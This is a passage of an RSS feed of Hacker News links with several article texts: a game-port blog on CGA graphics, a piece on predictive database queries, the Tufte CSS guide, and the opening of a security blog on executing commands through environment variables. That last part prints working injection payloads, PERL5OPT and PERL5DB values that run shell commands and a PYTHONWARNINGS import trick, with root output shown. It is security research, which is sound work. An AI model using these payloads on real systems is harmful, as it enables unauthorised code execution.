</p><p>As the source code to the game was available, albeit in Pascal, not much
reverse engineering was required. Most of the effort went into the translation
to C, and building new code to provide workalikes for the Turbo Pascal API.

</p><p>One of the last parts I worked on, the sound, also turned out to be one of
the most difficult. The original game used PC speaker sound in a dynamic way,
and I had to write a synthesizer for it. It was quite fiddly to get the timing
right and make it sound like the original. More on that in part two.

</p><p>The original code is around 5500 lines of Pascal, all of it game logic code.
The new C version is around 5500 lines of game logic, 1500 lines of support
code and 400 lines of comments.

</p><p>Compared to the last project, there isn't too much behind the scenes
unpublished code in this one. I wrote a few small pieces to aid translation,
some scripts to build the font data, and some prototypes to help figure out the
sound code.

</p><p>I did end up writing a little bit of pascal code, mostly as temporary mods to the
original game source to help me figure out what the original system was doing. More
detail on compiling the old code is provided in a later piece.

</p><h2>Graphics</h2>

<p>One of the very first things I did on the project was to figure out the framebuffer format
for the original game, and start hacking to get it to display on a modern system.

</p><p>The frame buffer is CGA, meaning it is 320 pixels wide, 200 lines high and has
2 bit paletted color, for a grand total of four possible colors on screen at
any one time.

</p><p>Below is a selection of screen shots from the game in all their CGA glory.</p>



<p>If you look carefully, even though each screen can only show four colors, 
you can see that there are more than four colors in total. This is due to
palettes. In the CGA scheme, four base color palettes are available and each has a
different arrangement of sixteen possible colors.

</p><p>As an extra tweak, the first color in the palette (typically the background color), can be
freely chosen out of the sixteen, giving slightly more flexibility. This means that there
are sixteen variations of each of the four base palettes, giving sixty four palettes in total.

<a id="picker_link"></a>

</p><p>To play with the color combinations, <span>click</span> on the colored areas in the first panel below.
You can pick a palette and background color, and the effect will be shown in the second panel,
using one of the screenshots. Use prev and next to cycle to a different screenshot.

</p>


<p>In the old system, the framebuffer and the palette settings are bits of memory
that live on the graphics card and are twiddled by the game directly. In the
new system, these reside in host memory, and must be converted into a modern texture format
on the fly every frame for the GPU to use.

</p><p>Given that there are only 64 possible palettes, a neat trick can be used to
simplify and speed up the framebuffer conversion. Before the game starts
running, every possible combination of palette, background color and input
framebuffer byte (4 pixels at 2bpp) are iterated through, and the resulting 8
output bytes (4 pixels at 16bpp) are stored in a 16 * 4 * 256 entry lookup
table. Converting the framebuffer each frame is then just a matter of iterating
through each byte and performing a simple lookup and memcpy to stamp out four
pixels at a time.

</p><h2>To be continued...</h2>

<p>As mentioned earlier, the sound code was one of the hardest parts of the port. Part two
explains why that was so, and the solution I used to solve it.</p>

<p>The canvas below shows a little preview.</p>












</article></div>]]>
            </description>
            <link>https://blog.loadzero.com/blog/chopper258/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23830881</guid>
            <pubDate>Tue, 14 Jul 2020 12:07:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Could predictive database queries replace machine learning models?]]>
            </title>
            <description>
<![CDATA[
Score 85 | Comments 42 (<a href="https://news.ycombinator.com/item?id=23830474">thread link</a>) | @tlarkworthy
<br/>
July 14, 2020 | https://aito.ai/blog/could-predictive-database-queries-replace-machine-learning-models | <a href="https://web.archive.org/web/*/https://aito.ai/blog/could-predictive-database-queries-replace-machine-learning-models">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><blockquote><p>This post appeared first on <a href="https://towardsdatascience.com/predictive-queries-vs-supervised-ml-models-ee7f17e4840e">Towards Data Science</a> in July 12th, 2020.</p></blockquote><p>One of the greatest trends in today’s technology landscape is the <a href="http://knowledge.wharton.upenn.edu/article/democratization-ai-means-tech-innovation/">democratization of machine learning</a>. Because the commodity state-of-the-art models, better tooling and better access to hardware: machine learning is becoming an everyday tool in the companies’ toolbox.</p><p>The ML democratization is still an on-going trend and given the disruption in this space it’s worth asking: where will this transformation take us? What the future of the everyday ML will look like?</p><p>Predictive queries are an interesting take on machine learning, especially in the ML democratization context. Solutions like <a href="http://probcomp.csail.mit.edu/">MIT’s</a> <a href="https://github.com/probcomp/bayeslite">BayesDB/BayesLite</a> and Aito provide a way to get arbitrary predictions instantly with SQL-like queries. As an example, here’s a predictive query in Aito:</p><div data-language="json"><pre><code><span>{</span>
  <span>"from"</span><span>:</span> <span>"invoice_data"</span><span>,</span>
  <span>"where"</span><span>:</span> <span>{</span>
    <span>"Item_Description"</span><span>:</span> <span>"Packaging design"</span><span>,</span>
    <span>"Vendor_Code"</span><span>:</span> <span>"VENDOR-1676"</span>
  <span>}</span><span>,</span>
  <span>"predict"</span><span>:</span> <span>"Product_Category"</span>
<span>}</span></code></pre></div><p>As such: the predictive queries seem like an easier, faster and radically different way to do machine learning. They give a glimpse of a future, where anyone can do machine learning as easily as one does database queries.</p><p>This article gives a brief introduction to the predictive queries, and it compares the predictive queries to supervised learning through 3 different aspects that are:</p><ol><li>The workflow, comparing the easiness and the costs between predictive queries and supervised machine learning</li><li>The architecture, comparing the high level differences between using predictive queries and using supervised models</li><li>And the qualitative properties (scaling, accuracy) as the quality is an obvious concern for an emerging, if promising, technology.</li></ol><h2>Introduction to the predictive queries</h2><p>Predictive queries resemble normal database queries with the exception that they provide predictions about the unknown, while the traditional database queries provide facts about the known. Here’s an example of the BQL (Bayesian Query Language) query done against BayesDB/BayesLite database:</p><div><div><p><img src="https://aitoai-public.s3.eu-central-1.amazonaws.com/website-assets/blog/pq-vs-ml-predictive-queries-in-bayeslite.png" alt=""></p></div><p><span>Predictive BayesQL queries in BayesLite. BayesQL is based on SQL and it provides a very elegant way to query arbitrary estimates. This query can be executed after the CREATE POPULATION, CREATE ANALYSIS, INITIALIZE ANALYSIS and ANALYZE operations. </span></p></div><p>In essence, the predictive queries can provide a very SQL-like alternative to the supervised ML models with the key differences that:</p><ol><li><p>While supervised machine learning models need to be configured, trained and deployed before usage, the predictive queries provide instant answers after the database is prepared with data. As such: the predictive queries have a different workflow.</p></li><li><p>While supervised machine learning is always specialized for a single prediction from A to B, predictive queries can be used a) to instantly predict any unknown X based on any known Y and b) to provide also recommendations, smart search and pattern mining. As such, the supervised models are narrow, while the predictive queries are multipurpose, which has implications on the architecture.</p></li><li><p>While with the supervised machine learning the narrow models are explicitly formed train time, the predictive queries do multi-purpose modeling write time or narrow modeling during query time. As such: the predictive queries are technically more challenging.</p></li></ol><p>Only few solutions exist, that provide such predictive queries. One is the mentioned BayesDB/BayesLite, which creates an in-memory multi-purpose models in a special preparation phase. Another solution is Aito.ai, which does query-time narrow modeling without explicit preparations. Here’s is an example of the Aito workflow:</p><div><div><p><img src="https://aitoai-public.s3.eu-central-1.amazonaws.com/website-assets/blog/pq-vs-ml-predictive-queries-in-3-steps.png" alt=""></p></div><p><span>Predictive BayesQL queries in BayesLite. BayesQL is based on SQL and it provides a very elegant way to query arbitrary estimates. This query can be executed after the CREATE POPULATION, CREATE ANALYSIS, INITIALIZE ANALYSIS and ANALYZE operations. </span></p></div><p>We are focusing the following comparisons on Aito. We feel this focus is justified as in Aito we are more familiar with the solution, and it is mature enough to serve the end customers in live production settings. While BayesLite is extremely impressive and their BQL interface and DB/ML integration are worth envy: BayesLite seems to have properties like the 16 minute preparation phase for simple data, which are not consistent with the presented arguments.</p><p>So let’s next dig deeper on the difference in workflow, architecture and quality between the predictive queries and supervised ML models.</p><h2>1. The Workflow</h2><p>The first difference between predictive queries and the traditional supervised models relates to the workflow and the costs.</p><p>Supervised ML models are deployed typically in data science projects, which have several steps like the handover to the data scientist, data preparation, feature engineering, model fitting, deployment, integrations, retraining and monitoring &amp; maintenance. As an addition to this linear progression, you also often have an iteration phase, where the results are improved by refining the data, the preparations, the features, the models, the deployment or the integrations.</p><div><div><p><img src="https://aitoai-public.s3.eu-central-1.amazonaws.com/website-assets/blog/pq-vs-ml-data-science-project-workflow.png" alt=""></p></div><p><span>A simplified version of the data science project.</span></p></div><p>Taking a supervised model to production may take several weeks or months from one to two persons. This can raise the price point up to hundred thousand euros per model. If you need several models, you need several data science projects, leading to multiplied expenses and delays.</p><p>Now this process changes rather dramatically, if you implement the machine learning functionality with predictive queries. With predictive queries the workflow is in essence the following:</p><ol><li>Prepare the auxiliary <a href="https://aito.ai/blog/introducing-a-new-database-category-the-predictive-database/">predictive database</a> once (if it’s not used as the main database)</li><li>Verify good enough prediction quality with evaluate requests</li><li>Integrate the predictive queries like you would integrate SQL queries</li><li>Write the test/evaluation cases, push these to Git and let the CI handle the regression testing</li><li>If seen as necessary: track the in-production prediction quality with analytics and display the metrics in the product dashboard.</li></ol><div><div><p><img src="https://aitoai-public.s3.eu-central-1.amazonaws.com/website-assets/blog/pq-vs-ml-predictive-query-workflow.png" alt=""></p></div><p><span>The workflow with the predictive queries is similar to the workflow with the database queries. Still, because predictive functionality is statistical and its behavior may drift as the data changes: it is advisable to verify the prediction quality (step 2) before implementation and monitor the prediction quality in production (step 5).</span></p></div><p>While putting an auxiliary database (like ElasticSearch) into production can take weeks, the expense related to putting each query into production is closer to the expense of using search/database queries. Often such queries form only a small part of the related functionality’s expense, and often the query based functionality can be implemented in hours and put into production in days.</p><p>This dramatic difference between the workflows and the expenses are explained a) partly by the <a href="https://aito.ai/blog/introducing-a-new-database-category-the-predictive-database/">predictive database</a>’s AutoML capabilities that are accelerated by a specialized database and b) partly by the reduced need for deployments and integrations as the data and the ML are already integrated into a single system. The complex phases of the data science project get systematically eliminated or simplified:</p><ol><li>The handover of the data science project to the data scientist is not needed as the predictive query workflow is easy enough for the software developers.</li><li>Data preparation and feature engineering steps can be greatly eliminated with the ML-database integration. You don’t need to re-prepare and re-upload the data, if the data is already in the database. You don’t need to manually aggregate data into flat data frames, if you can do <a href="https://aito.ai/docs/articles/utilizing-relationships-in-aito/">inference through the database references</a>. You don’t need to manually featurize text either, as the predictive database analyzes the <a href="https://aito.ai/docs/api/#schema-analyzer">text automatically</a> just like ElasticSearch. Last: you don’t need to manage feature redundancies, if the database has built-in <a href="https://aito.ai/blog/introducing-concept-learning-to-free-you-from-feature-engineering/">feature learning capabilities</a>.</li><li>Modeling phase can be automated with a single sophisticated model that provides good enough results for most applications.</li><li>Per model cloud deployment, live integrations and retraining of models simply disappear, because you don’t need to ‘deploy’ or retrain the predictive queries. Instead you integrate one auxiliary predictive database like you would integrate <a href="https://www.elastic.co/">ElasticSearch</a>. If you use the predictive database as your main database, you can omit even that one integration.</li><li>Maintenance is easier, because instead of maintaining deployed infrastructure for each prediction target, you maintain the SQL-like queries like you would maintain code with Git &amp; CI.</li></ol><p>As a consequence, the workflow and the cost of implementing ML via predictive queries is similar to the process of implementing normal business logic via SQL.</p><p>The second difference between the predictive queries and the supervised models is the narrowness and it’s implications on the software architecture.</p><p>Famously: the supervised ML models are <em>narrow</em> in 2 different respects:</p><p>1.Narrowness of the prediction setting. Supervised learning models are essentially narrow functions from A (e.g. text) to B (category), which means that if you have 10 different problems, you end up with with 10 different supervised ML models.
2. Narrowness of the predictive functionality type. A single kind of supervised method can typically serve only one kind of predictions. For this reason you often need completely separate systems or products to implement predictions, recommendations, smart search and pattern mining.d up with with 10 different supervised ML models.</p><p>This combined narrowness has negative implications on the architecture. If you have 10 different predictive functionalities that mix prediction, recommendation and smart search use cases: you end up struggling with a very complex system. The system may include separate supervised model platform with half dozen deployed models, separate recommendation system, a separate smart searching product and separate pattern mining tools. Such complexity is hard to learn, master and …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://aito.ai/blog/could-predictive-database-queries-replace-machine-learning-models">https://aito.ai/blog/could-predictive-database-queries-replace-machine-learning-models</a></em></p>]]>
            </description>
            <link>https://aito.ai/blog/could-predictive-database-queries-replace-machine-learning-models</link>
            <guid isPermaLink="false">hacker-news-small-sites-23830474</guid>
            <pubDate>Tue, 14 Jul 2020 11:01:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tufte CSS]]>
            </title>
            <description>
<![CDATA[
Score 58 | Comments 9 (<a href="https://news.ycombinator.com/item?id=23828196">thread link</a>) | @mmastrac
<br/>
July 13, 2020 | https://edwardtufte.github.io/tufte-css/ | <a href="https://web.archive.org/web/*/https://edwardtufte.github.io/tufte-css/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
      
      <p>Dave Liepmann</p>
      <section>
        <p>Tufte CSS provides tools to style web articles using the ideas demonstrated by Edward Tufte’s books and handouts. Tufte’s style is known for its simplicity, extensive use of sidenotes, tight integration of graphics with text, and carefully chosen typography.</p>
        <p>Tufte CSS was created by <a href="http://www.daveliepmann.com/">Dave Liepmann</a> and is now an Edward Tufte project. The original idea was cribbed from <a href="https://tufte-latex.github.io/tufte-latex/">Tufte-<span>L<span>a</span>T<span>e</span>X</span></a> and <a href="http://rmarkdown.rstudio.com/tufte_handout_format.html">R Markdown’s Tufte Handout format</a>. We give hearty thanks to all the people who have contributed to those projects.</p>
        <p>If you see anything that Tufte CSS could improve, we welcome your contribution in the form of an issue or pull request on the GitHub project: <a href="https://github.com/edwardtufte/tufte-css">tufte-css</a>. Please note the <a href="https://github.com/edwardtufte/tufte-css#contributing">contribution guidelines</a>.</p>
        <p>Finally, a reminder about the goal of this project. The web is not print. Webpages are not books. Therefore, the goal of Tufte CSS is not to say “websites should look like this interpretation of Tufte’s books” but rather “here are some techniques Tufte developed that we’ve found useful in print; maybe you can find a way to make them useful on the web”. Tufte CSS is merely a sketch of one way to implement this particular set of ideas. It should be a starting point, not a design goal, because any project should present their information as best suits their particular circumstances.</p>
      </section>

      <section>
        <h2 id="getting-started">Getting Started</h2>
        <p>To use Tufte CSS, copy <code>tufte.css</code> and the <code>et-book</code> directory of font files to your project directory, then add the following to your HTML document’s <code>head</code> block:</p>

        <pre><code>&lt;link rel="stylesheet" href="tufte.css"/&gt;</code></pre>

        <p>Now you just have to use the provided CSS rules, and the Tufte CSS conventions described in this document. For best results, View Source and Inspect Element frequently.</p>
      </section>

      <section>
        <h2 id="fundamentals">Fundamentals</h2>
        <h3 id="fundamentals--sections-and-headers">Sections and Headings</h3>
        <p>Organize your document with an <code>article</code> element inside your <code>body</code> tag. Inside that, use <code>section</code> tags around each logical grouping of text and headings.</p>
        <p>Tufte CSS uses <code>h1</code> for the document title, <code>p</code> with class <code>subtitle</code> for the document subtitle, <code>h2</code> for section headings, and <code>h3</code> for low-level headings. More specific headings are not supported. If you feel the urge to reach for a heading of level 4 or greater, consider redesigning your document:</p>
        <blockquote cite="http://www.edwardtufte.com/bboard/q-and-a-fetch-msg?msg_id=0000hB">
          <p>[It is] notable that the Feynman lectures (3 volumes) write about all of physics in 1800 pages, using only 2 levels of hierarchical headings: chapters and A-level heads in the text. It also uses the methodology of <em>sentences</em> which then cumulate sequentially into <em>paragraphs</em>, rather than the grunts of bullet points. Undergraduate Caltech physics is very complicated material, but it didn’t require an elaborate hierarchy to organize.</p>
          
        </blockquote>
        <p>As a bonus, this excerpt regarding the use of headings provides an example of block quotes. In Tufte CSS they are just lightly styled, semantically correct HTML using <code>blockquote</code> and <code>footer</code> elements. See page 20 of <a href="https://www.edwardtufte.com/tufte/books_vdqi">The Visual Display of Quantitative Information</a> for an example in print.</p>
        <p><span>In his later books<label for="sn-in-his-later-books"></label></span><span><a href="http://www.edwardtufte.com/tufte/books_be"><em>Beautiful Evidence</em></a></span>, Tufte starts each section with a bit of vertical space, a non-indented paragraph, and the first few words of the sentence set in small caps. For this we use a span with the class <code>newthought</code>, as demonstrated at the beginning of this paragraph. Vertical spacing is accomplished separately through <code>&lt;section&gt;</code> tags. Be consistent: though we do so in this paragraph for the purpose of demonstration, do not alternate use of header elements and the <code>newthought</code> technique. Pick one approach and stick to it.</p>

        <h3 id="fundamentals--text">Text</h3>
        <p>Although paper handouts obviously have a pure white background, the web is better served by the use of slightly off-white and off-black colors. Tufte CSS uses <code>#fffff8</code> and <code>#111111</code> because they are nearly indistinguishable from their ‘pure’ cousins, but dial down the harsh contrast. We stick to the greyscale for text, reserving color for specific, careful use in figures and images.</p>
        <p>In print, Tufte has used the proprietary Monotype Bembo<label for="sn-proprietary-monotype-bembo"></label><span>See Tufte’s comment in the <a href="http://www.edwardtufte.com/bboard/q-and-a-fetch-msg?msg_id=0000Vt">Tufte book fonts</a> thread.</span> font. A similar effect is achieved in digital formats with the now open-source <a href="https://github.com/edwardtufte/et-book">ETBook</a>, which Tufte CSS supplies with a <code>@font-face</code> reference to a .ttf file. In case ETBook somehow doesn’t work, Tufte CSS shifts gracefully to other serif fonts like Palatino and Georgia.</p>
        <p>Also notice how Tufte CSS includes separate font files for bold (strong) and italic (emphasis), instead of relying on the browser to mechanically transform the text. This is typographic best practice.</p>
        <p>If you prefer sans-serifs, use the <code>sans</code> class. It relies on Gill Sans, Tufte’s sans-serif font of choice.</p>
        <p>Links in Tufte CSS match the body text in color and do not change on mouseover or when clicked. Here is a <a href="#">dummy example</a> that goes nowhere. These links are underlined, since this is the most widely recognized indicator of clickable text. <label for="mn-blue-links">⊕</label><span>Blue text, while also a widely recognizable clickable-text indicator, is crass and distracting. Luckily, it is also rendered unnecessary by the use of underlining.</span> However, because most browsers’ default underlining does not clear descenders and is so thick and distracting, the underline effect is instead achieved using CSS trickery involving background gradients instead of standard <code>text-decoration</code>. Credit goes to Adam Schwartz for that technique.</p>
        <p>As always, these design choices are merely one approach that Tufte CSS provides by default. Other approaches can also be made to work. The goal is to make sentences readable without interference from links, as well as to make links immediately identifiable even by casual web users.</p>
      </section>

      <section>
        <h2 id="epigraphs">Epigraphs</h2>
        <div>
          <blockquote>
            <p>The English language . . . becomes ugly and inaccurate because our thoughts are foolish, but the slovenliness of our language makes it easier for us to have foolish thoughts.</p>
            
          </blockquote>
          <blockquote>
            <p>For a successful technology, reality must take precedence over public relations, for Nature cannot be fooled.</p>
            
          </blockquote>
          <blockquote>I do not paint things, I paint only the differences between things.</blockquote>
        </div>
        <p>If you’d like to introduce your page or a section of your page with some quotes, use epigraphs. Modeled after chapter epigraphs in Tufte’s books (particularly <em>Beautiful Evidence</em>), these are <code>blockquote</code> elements with a bit of specialized styling. Quoted text is italicized. The source goes in a <code>footer</code> element inside the <code>blockquote</code>. We have provided three examples in the epigraph of this section, demonstrating shorter and longer quotes, with and without a paragraph tag, and showing how multiple quotes within an epigraph fit together with the use of a wrapper class.</p>
      </section>

      <section>
        <h2 id="sidenotes">Sidenotes: Footnotes and Marginal Notes</h2>
        <p>One of the most distinctive features of Tufte’s style is his extensive use of sidenotes.<label for="sn-extensive-use-of-sidenotes"></label><span>This is a sidenote.</span> Sidenotes are like footnotes, except they don’t force the reader to jump their eye to the bottom of the page, but instead display off to the side in the margin. Perhaps you have noticed their use in this document already. You are very astute.</p>
        <p>Sidenotes are a great example of the web not being like print. On sufficiently large viewports, Tufte CSS uses the margin for sidenotes, margin notes, and small figures. On smaller viewports, elements that would go in the margin are hidden until the user toggles them into view. The goal is to present related but not necessary information such as asides or citations <em>as close as possible</em> to the text that references them. At the same time, this secondary information should stay out of the way of the eye, not interfering with the progression of ideas in the main text.</p>
        <p>Sidenotes consist of two elements: a superscript reference number that goes inline with the text, and a sidenote with content. To add the former, just put a label and dummy checkbox into the text where you want the reference to go, like so:</p>
        <pre><code>&lt;label for="sn-demo"
       class="margin-toggle sidenote-number"&gt;
&lt;/label&gt;
&lt;input type="checkbox"
       id="sn-demo"
       class="margin-toggle"/&gt;</code></pre>
        <p>You must manually assign a reference <code>id</code> to each side or margin note, replacing “sn-demo” in the <code>for</code> and the <code>id</code> attribute values with an appropriate descriptor. It is useful to use prefixes like <code>sn-</code> for sidenotes and <code>mn-</code> for margin notes.</p>
        <p>Immediately adjacent to that sidenote reference in the main text goes the sidenote content itself, in a <code>span</code> with class <code>sidenote</code>. This tag is also inserted directly in the middle of the body text, but is either pushed into the margin or hidden by default. Make sure to position your sidenotes correctly by keeping the sidenote-number label close to the sidenote itself.</p>
        <p>If you want a sidenote without footnote-style numberings, then you want a margin note.
          <label for="mn-demo">⊕</label>
          
          <span>
            This is a margin note. Notice there isn’t a number preceding the note.
          </span> On large screens, a margin note is just a sidenote that omits the reference number. This lessens the distracting effect taking away from the flow of the main text, but can increase the cognitive load of matching a margin note to its referent text. However, on small screens, a margin note is like a sidenote except its viewability-toggle is a symbol rather than a reference number. This document currently uses the symbol ⊕ (<code>&amp;#8853;</code>), but it’s up to you.</p>
        <p>Margin notes are created just like sidenotes, but with the <code>marginnote</code> class for the content and the <code>margin-toggle</code> class for the label and dummy checkbox. For instance, here is the code for the margin note used in the previous paragraph:</p>
        <pre><code>&lt;label for="mn-demo" class="margin-toggle"&gt;&amp;#8853;&lt;/label&gt;
&lt;input type="checkbox" id="mn-demo" class="margin-toggle"/&gt;
&lt;span class="marginnote"&gt;
  This is a margin note. Notice there isn’t a number preceding the note.
&lt;/span&gt;</code></pre>
        </section></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://edwardtufte.github.io/tufte-css/">https://edwardtufte.github.io/tufte-css/</a></em></p>]]>
            </description>
            <link>https://edwardtufte.github.io/tufte-css/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23828196</guid>
            <pubDate>Tue, 14 Jul 2020 03:29:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Strange public IPv4 address assigned behind NAT (2019)]]>
            </title>
            <description>
<![CDATA[
Score 84 | Comments 86 (<a href="https://news.ycombinator.com/item?id=23827521">thread link</a>) | @rohan1024
<br/>
July 13, 2020 | https://broadbandforum.co/t/190267/ | <a href="https://web.archive.org/web/*/https://broadbandforum.co/t/190267/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://broadbandforum.co/t/190267/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23827521</guid>
            <pubDate>Tue, 14 Jul 2020 01:12:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hacking with environment variables]]>
            </title>
            <description>
<![CDATA[
Score 221 | Comments 63 (<a href="https://news.ycombinator.com/item?id=23827486">thread link</a>) | @pentestercrab
<br/>
July 13, 2020 | https://www.elttam.com/blog/env/ | <a href="https://web.archive.org/web/*/https://www.elttam.com/blog/env/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                        

<p>On a recent project we gained the ability to specify environment variables but not the process that was executed.
We were also unable to control the contents of a file on disk, and bruteforcing process identifiers (PIDs) and file descriptors found no interesting results, eliminating <a href="https://www.elttam.com/blog/goahead/">remote LD_PRELOAD exploitation</a>.
Fortunately, a scripting language interpreter was executed which enabled us to execute arbitrary commands by specifying particular environment variables.
This blog post discusses how arbitrary commands can be executed by a range of scripting language interpreters when supplied with malicious environment variables.</p>



<p>A quick read of the <code>ENVIRONMENT</code> section of the <code>perlrun(1)</code> man page reveals plenty of environment variables worth investigating.
The <code>PERL5OPT</code> environment variable allows specifying command-line options, but is restricted to only accepting the options <code>CDIMTUWdmtw</code>.
This unfortunately means that <code>-e</code>, which allows supplying perl code to run, is out.</p>

<p>All is not lost though, as demonstrated in the <a href="https://github.com/HackerFantastic/exploits/blob/master/cve-2016-1531.sh">exploit</a> for CVE-2016-1531 by <a href="https://twitter.com/hackerfantastic">Hacker Fantastic</a>.
The exploit writes a malicious perl module to <code>/tmp/root.pm</code> and supplies the environment variables <code>PERL5OPT=-Mroot</code> and <code>PERL5LIB=/tmp</code> to achieve arbitrary code execution.
However this was an exploit for a local privilege escalation vulnerability and a generic technique should ideally not require access to the file system. Looking at <a href="https://twitter.com/bl4sty">blasty</a>’s <a href="https://haxx.in/blasty-vs-exim.sh">exploit</a> for the same CVE, the exploit did not require creating a file and used the environment variables <code>PERL5OPT=-d</code> and <code>PERL5DB=system("sh");exit;</code>.
The same environment variables were also used to <a href="https://old.reddit.com/r/netsec/comments/1dm8fv/hack_this_website_and_win_bitcoins_the_first/c9tm6j4/">solve a CTF challenge</a> in 2013.</p>

<p>One final nicety of a generic technique would be to use a single environment variable instead of two.
<a href="https://twitter.com/justinsteven">@justinsteven</a> found this was possible by leveraging <code>PERL5OPT=-M</code>.
While either <code>-m</code> or <code>-M</code> can be used to load a perl module, the <code>-M</code> option allows adding extra code after the module name.</p>

<h2 id="proof-of-concept">Proof of Concept</h2>

<figure>
  <figcaption>Figure-0: arbitrary code execution achieved using an environment variable against perl running an empty script (/dev/null)</figcaption>

<figure><pre><code data-lang="console"><span>$</span><span> </span>docker run <span>--env</span> <span>'PERL5OPT=-Mbase;print(`id`)'</span> perl:5.30.2 perl /dev/null
<span>uid=0(root) gid=0(root) groups=0(root)</span></code></pre></figure>

</figure>



<p>Reading the <code>ENVIRONMENT VARIABLES</code> section of the <code>python(1)</code> man page, <code>PYTHONSTARTUP</code> initially appears like it may be a piece of a straightforward solution.
It allows specifying a path to a Python script that will be executed prior to displaying the prompt in interactive mode.
The interactive mode requirement didn’t seem like it would be an issue as the <code>PYTHONINSPECT</code> environment variable can be used to enter interactive mode, the same as specifying <code>-i</code> on the command line.
However, the documentation for the <code>-i</code> option explains that <code>PYTHONSTARTUP</code> will not be used when python is started with a script to execute.
This means that <code>PYTHONSTARTUP</code> and <code>PYTHONINSPECT</code> cannot be combined and <code>PYTHONSTARTUP</code> only has an effect when the python REPL is immediately launched.
This ultimately means that <code>PYTHONSTARTUP</code> is not viable as it has no effect when executing a regular Python script.</p>

<p>Other environment variables which looked promising were <code>PYTHONHOME</code> and <code>PYTHONPATH</code>. Both of these will let you gain arbitrary code execution but require you to also be able to create directories and files on the filesystem. It may be possible to loosen those requirements through the use of the proc filesystem and/or ZIP files.</p>

<p>The majority of the remaining environment variables are simply checked if they contain a non-empty string, and if so, toggle a generally benign setting. One of the rare exceptions to this is <code>PYTHONWARNINGS</code>.</p>

<h2 id="making-progress-with-pythonwarnings">Making progress with PYTHONWARNINGS</h2>
<p>The documentation for <code>PYTHONWARNINGS</code> states <code>it is equivalent to specifying the -W option</code>. The <code>-W</code> option is used for warning control to specify which warnings and how often they are printed. The full form of argument is <code>action:message:category:module:line</code>. While warning control didn’t seem like a promising lead, that quickly changed after checking the implementation.</p>

<figure>
  <figcaption>Figure-1: Python-3.8.2/Lib/warnings.py</figcaption>

<figure><pre><code data-lang="python"><span>[...]</span>
<span>def</span> <span>_getcategory</span><span>(</span><span>category</span><span>):</span>
    <span>if</span> <span>not</span> <span>category</span><span>:</span>
        <span>return</span> <span>Warning</span>
    <span>if</span> <span>'.'</span> <span>not</span> <span>in</span> <span>category</span><span>:</span>
        <span>import</span> <span>builtins</span> <span>as</span> <span>m</span>
        <span>klass</span> <span>=</span> <span>category</span>
    <span>else</span><span>:</span>
        <span>module</span><span>,</span> <span>_</span><span>,</span> <span>klass</span> <span>=</span> <span>category</span><span>.</span><span>rpartition</span><span>(</span><span>'.'</span><span>)</span>
        <span>try</span><span>:</span>
            <span>m</span> <span>=</span> <span>__import__</span><span>(</span><span>module</span><span>,</span> <span>None</span><span>,</span> <span>None</span><span>,</span> <span>[</span><span>klass</span><span>])</span>
        <span>except</span> <span>ImportError</span><span>:</span>
            <span>raise</span> <span>_OptionError</span><span>(</span><span>"invalid module name: %r"</span> <span>%</span> <span>(</span><span>module</span><span>,))</span> <span>from</span> <span>None</span>
<span>[...]</span></code></pre></figure>

</figure>

<p>The above code shows that as long as our specified category contains a dot, we can trigger the import an arbitrary Python module.</p>

<p>The next problem is that the vast majority of modules from Python’s standard library run very little code when imported. They tend to just define classes to be used later, and even when they provide code to run, the code is typically <a href="https://docs.python.org/3/library/__main__.html">guarded with a check of the <code>__main__</code> variable</a> (to detect if the file has been imported or run directly).</p>

<p>An unexpected exception to this is the <a href="https://xkcd.com/353/">antigravity module</a>. The Python developers included an <a href="https://en.wikipedia.org/wiki/Easter_egg_(media)">easter egg</a> in <a href="https://github.com/python/cpython/commit/206e3074d34aeb5a4d0c1e24d970b6569f7ad702">2008</a> which can be triggered by running <code>import antigravity</code>. This import will immediately open your browser to the xkcd comic that joked that <code>import antigravity</code> in Python would grant you the ability to fly.</p>

<p>As for how the <code>antigravity</code> module opens your browser, it uses another module from the standard library called <code>webbrowser</code>. This module checks your PATH for a large variety of browsers, including mosaic, opera, skipstone, konqueror, chrome, chromium, firefox, links, elinks and lynx. It also accepts an environment variable <code>BROWSER</code> that lets you specify which process should be executed. It is not possible to supply arguments to the process in the environment variable and the xkcd comic URL is the one hard-coded argument for the command.</p>

<p>The ability to turn this into arbitrary code execution depends on what other executables are available on the system.</p>

<h2 id="leveraging-perl-for-arbitrary-code-execution">Leveraging Perl for Arbitrary Code Execution</h2>

<p>One approach is to leverage Perl which is commonly installed on systems and is even available in the standard Python docker image. However, the <code>perl</code> binary cannot itself be used. This is because the first and only argument is the xkcd comic URL. The comic URL argument will cause an error and the process to exit without the <code>PERL5OPT</code> environment variable being used.</p>

<figure>
  <figcaption>Figure-2: PERL5OPT having no effect when a URL is passed to perl</figcaption>

<figure><pre><code data-lang="console"><span>$</span><span> </span>docker run <span>-e</span> <span>'PERL5OPT=-Mbase;print(`id`);exit'</span> perl:5.30.2 perl https://xkcd.com/353/
<span>Can't open perl script "https://xkcd.com/353/": No such file or directory</span></code></pre></figure>

</figure>

<p>Fortunately, when Perl is available it also common to have the default Perl scripts available, such as perldoc and perlthanks. These scripts will also error and exit with an invalid argument, but the error in this case happens later than the processing of the <code>PERL5OPT</code> environment variable. This means you can leverage the Perl environment variable payload detailed earlier in this blog post.</p>

<figure>
  <figcaption>Figure-3: PERL5OPT working as intended with perldoc and perlthanks</figcaption>

<figure><pre><code data-lang="console"><span>$</span><span> </span>docker run <span>-e</span> <span>'PERL5OPT=-Mbase;print(`id`);exit'</span> perl:5.30.2 perldoc https://xkcd.com/353/
<span>uid=0(root) gid=0(root) groups=0(root)
</span><span>$</span><span> </span>run <span>-e</span> <span>'PERL5OPT=-Mbase;print(`id`);exit'</span> perl:5.30.2 perlthanks https://xkcd.com/353/
